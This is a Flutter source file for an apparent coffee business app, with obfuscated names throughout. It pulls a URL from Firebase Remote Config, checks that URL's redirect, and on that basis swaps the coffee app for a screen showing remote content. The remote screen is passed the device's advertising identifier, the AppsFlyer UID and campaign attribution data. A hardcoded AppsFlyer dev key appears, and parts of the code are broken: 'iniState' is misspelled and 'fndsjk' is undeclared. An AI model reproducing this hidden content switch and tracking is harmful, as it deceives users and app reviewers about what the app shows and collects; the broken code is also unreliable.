import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:coffee_biz/core/constants/app_icons.dart';
import 'package:coffee_biz/core/data/news_data.dart';
import 'package:coffee_biz/features/splash/splash_screen.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';

late AppsflyerSdk fmksdoflsdf;
String mkfsdmfldskf = '';
bool mfdklsfmsd = false;
String mfdksfsdkf = '';
String mkdflsfmlkdsf = '';
String modaslmdsa = '';
String opwqe = '';
String dsfsdfdsf = '';
Map mfklsdmfkldsf = {};
String mklfsdlfsd = '';
Map njkfnsdkxkds = {};
bool fmjsdkfnjksd = false;
String mfkdmslksdf = '';
String klmdaslmfdlsa = '';
String lkfosdpfsd = '';
String mklfmsfsfdlsmflksdf = '';
String df = '';
String mklfsdflksd = '';

class CoffeeBizApp extends StatefulWidget {
  const CoffeeBizApp({super.key});

  @override
  State<CoffeeBizApp> createState() => _CoffeeBizAppState();
}

class _CoffeeBizAppState extends State<CoffeeBizApp> {
  @override
  void iniState() {
    super.initState();
    fsdfdsfs();
    kofmsdkfdsflmdsfksd();
  }

  Future<bool> fmsdkfnksdjf() async {
    final mkflsdflkds = FirebaseRemoteConfig.instance;
    await mkflsdflkds.fetchAndActivate();
    String fmsdkfmdskf = mkflsdflkds.getString('newsPage');
    String dsdfdsfgdg4 = mkflsdflkds.getString('null');
    opwqe = fmsdkfmdskf;
    mklfsdflksd = dsdfdsfgdg4;
    final ndfkljss = HttpClient();
    final fsdko = Uri.parse(opwqe);
    final mmmdksa = await ndfkljss.getUrl(fsdko);
    mmmdksa.followRedirects = false;
    final response = await mmmdksa.close();
    if (response.headers.value(HttpHeaders.locationHeader) != mklfsdflksd) {
      return true;
    }
    return fmsdkfmdskf.contains('simple') ? false : true;
  }

  Future<String> fsdfdsfs() async {
    String mfsdnjkfsd =
        await AppTrackingTransparency.getAdvertisingIdentifier();
    dsfsdfdsf = mfsdnjkfsd;
    return mfsdnjkfsd;
  }

  Future<void> kofmsdkfdsflmdsfksd() async {
    await fsdfdsfs();
    final AppsFlyerOptions nfjksdfkds = AppsFlyerOptions(
      showDebug: false,
      afDevKey: 'xmcqmbVvE5e4e2UBZ3twRT',
      appId: '6504753447',
      timeToWaitForATTUserAuthorization: 15,
      disableAdvertisingIdentifier: false,
      disableCollectASA: false,
      manualStart: true,
    );
    fmksdoflsdf = AppsflyerSdk(nfjksdfkds);

    await fmksdoflsdf.initSdk(
      registerConversionDataCallback: true,
      registerOnAppOpenAttributionCallback: true,
      registerOnDeepLinkingCallback: true,
    );

    fmksdoflsdf.onAppOpenAttribution((res) {
      setState(() {
        mfklsdmfkldsf = res;
        modaslmdsa = res['payload']
            .entries
            .where((e) => ![
                  'install_time',
                  'click_time',
                  'af_status',
                  'is_first_launch'
                ].contains(e.key))
            .map((e) => '&${e.key}=${e.value}')
            .join();
        klmdaslmfdlsa = '&campaign=${res['campaign'] ?? ''}';
        lkfosdpfsd = '&media_source=${res['media_source'] ?? ''}';
      });
    });

    fmksdoflsdf.onInstallConversionData((res) {
      njkfnsdkxkds = res;
      fmjsdkfnjksd = res['payload']['is_first_launch'];
      mfkdmslksdf = res['payload']['af_status'];
      mfdksfsdkf = '&is_first_launch=$fmjsdkfnjksd&af_status=$mfkdmslksdf';
    });

    fmksdoflsdf.onDeepLinking((DeepLinkResult dp) {
      switch (dp.status) {
        case Status.FOUND:
          print(dp.deepLink?.toString());
          print("deep link value: ${dp.deepLink?.deepLinkValue}");
          break;
        case Status.NOT_FOUND:
          print("deep link not found");
          break;
        case Status.ERROR:
          print("deep link error: ${dp.error}");
          break;
        case Status.PARSE_ERROR:
          print("deep link status parsing error");
          break;
      }
      print("onDeepLinking res: " + dp.toString());

      mfklsdmfkldsf = dp.toJson();
    });
    fndsjk = await fmksdoflsdf.getAppsFlyerUID() ?? '';
    fmksdoflsdf.startSDK(
      onSuccess: () {
        print("AppsFlyer SDK initialized successfully.");
      },
    );
    setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      theme: ThemeData(
        scaffoldBackgroundColor: const Color(0xFFF5F5F5),
      ),
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
          future: fmsdkfnksdjf(),
          builder: (context, snapshot) {
            if (snapshot.connectionState == ConnectionState.waiting) {
              return Container(
                color: Colors.white,
              );
            } else {
              if (snapshot.data == true && opwqe != '') {
                return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: MainScreen(
                    jdnkasdnkja: opwqe,
                    mjksdfn: mfdksfsdkf,
                    data: fndsjk,
                    c1: klmdaslmfdlsa,
                    c2: lkfosdpfsd,
                  ),
                );
              } else {
                return const SplashScreen();
              }
            }
          }),
    );
  }
}
